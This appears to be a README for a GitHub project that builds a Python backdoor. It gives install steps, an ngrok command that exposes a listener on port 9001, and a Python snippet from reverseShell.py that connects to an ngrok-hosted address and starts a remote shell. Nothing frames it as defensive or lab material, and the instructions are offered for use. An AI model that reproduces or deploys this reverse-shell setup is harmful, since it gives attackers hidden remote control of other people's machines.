# Backdoor

Creating a complete Backdoor using Python

## Installation

Use the package manager [pip](https://pip.pypa.io/en/stable/) to install missing modules.

```bash
pip install -r requirements.txt
```

## Usage
use [Ngrok](https://ngrok.com/) to exposes local server behind NATs and firewalls to the public internet over secure tunnels.
```bash
ngrok tcp 9001
```
change the reverseShell.py [code](https://github.com/msamyy/roodkcab/blob/cb93eade83a6c29268dc9d7577dd68a089d3223c/rs/reverseShell.py#L355) so it contains the address and the port generated by Ngrok, for example:
```python
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connection()
sock.connect(("8.tcp.ngrok.io", 17655))  # ngrok tcp 9001
print("connected")
shell()
```
